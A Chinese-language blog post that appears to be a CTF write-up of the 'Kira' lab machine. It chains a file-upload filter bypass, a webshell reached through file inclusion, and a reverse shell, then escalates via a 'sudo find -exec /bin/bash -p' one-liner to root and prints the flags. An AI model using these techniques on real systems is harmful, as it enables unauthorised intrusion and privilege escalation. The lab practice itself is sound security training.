+++
title = "KiraCTF"
date = 2026-06-15T20:19:58+08:00
draft = false
description = "一些打过的靶机"
tags = ["靶机"]
categories = ["靶机"]
series = ["靶机"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119224818718.png)  
  
  
开放80端口  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119224906661.png)  
  
  
  
访问，发现就有一个文件上传的，估计有漏洞的  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119225011481.png)  
  
发现上传php被过滤了，后面看了wp需要进行加一个jpg后缀进行绕过  
  
  
点开那个language发现存在那个文件包含漏洞  
  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119231621951.png)  
  
我们来上传一个木马来试一试  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260202233212451.png)  
  
然后进行远程命令进行包含  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260202233201758.png)  
  
然后此时进行nc命令监听  
  
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260202233324937.png)  
  
  

```
cwww-data@bassam-aziz:/home/bassam$ lslsDesktopDocumentsDownloadsMusicPicturesPublicTemplatesVideosexamples.desktopuser.txt
```

  
  
发现关键的user.txt文件,发现读取不了，命令被禁止了  
  

```
cwww-data@bassam-aziz:/home/bassam$ cat user.txt cat user.txtcat: user.txt: Permission denied
```

  
  
再次进行信息搜集  
  

```
cwww-data@bassam-aziz:/var/www/html$ lslsindex.htmllanguage.phpsupersecret-for-azizupload.phpuploadswww-data@bassam-aziz:/var/www/html$
```

  
  
发现有东西  
  

```
cwww-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ cat bassam-pass.txtcat bassam-pass.txtPassword123!@#
```

  
  
看到了里面的密码  
  
尝试登录，然后发现是这样的，但是必须是一个交互的终端才可，必须先要开启  
  

```
cpython3 -c 'import pty; pty.spawn("/bin/bash")'
```

  
  
然后发现登录成功  
  

```
cwww-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ su - bassamsu - bassamPassword: Password123!@#bassam@bassam-aziz:~$
```

  
  
尝试进行提权,这里进行sudo提权，发现这里面只有find有权限  
  

```
cbassam@bassam-aziz:~$ sudo -lsudo -l[sudo] password for bassam: Password123!@#Matching Defaults entries for bassam on bassam-aziz:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser bassam may run the following commands on bassam-aziz:    (ALL : ALL) /usr/bin/find
```

  
  
接下来进行尝试 sudo + find 提权  
  

```
cbassam@bassam-aziz:~$ sudo -u root /usr/bin/find . -exec /bin/bash -p \; -quit<-u root /usr/bin/find . -exec /bin/bash -p \; -quitroot@bassam-aziz:~# ididuid=0(root) gid=0(root) groups=0(root)
```

  
  
发现其中这一个文件，显然并不是  
  

```
croot@bassam-aziz:~# lslsDesktop    Downloads         Music     Public     user.txtDocuments  examples.desktop  Pictures  Templates  Videosroot@bassam-aziz:~# cat user.txtcat user.txtTHM{Bassam-Is-Better_Than-KIRA}
```

  
  
发现到了flag  
  

```
croot@bassam-aziz:/# find / -name flag.txtfind / -name flag.txtfind: ‘/proc/1559/task/1559/net’: Invalid argumentfind: ‘/proc/1559/net’: Invalid argumentfind: ‘/run/user/1000/gvfs’: Permission denied/root/flag.txt
```

  
  
然后就可以查询到了flag文件  
  

```
ccroot@bassam-aziz:/# cat /root/flag.txtcat /root/flag.txtTHM{root-Is_Better-Than_All-of-THEM-31337}
```